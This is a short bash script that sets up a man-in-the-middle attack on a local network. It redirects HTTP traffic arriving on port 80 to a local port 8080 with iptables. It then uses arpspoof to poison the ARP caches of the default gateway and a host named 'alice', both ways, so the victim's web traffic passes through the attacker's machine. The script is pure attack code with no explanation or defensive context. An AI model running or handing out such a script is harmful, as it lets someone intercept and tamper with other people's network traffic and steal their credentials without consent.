#!/bin/bash

iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
arpspoof -i eth0 -r -t `ip route show default | awk '{print $3}'` `dig +short alice`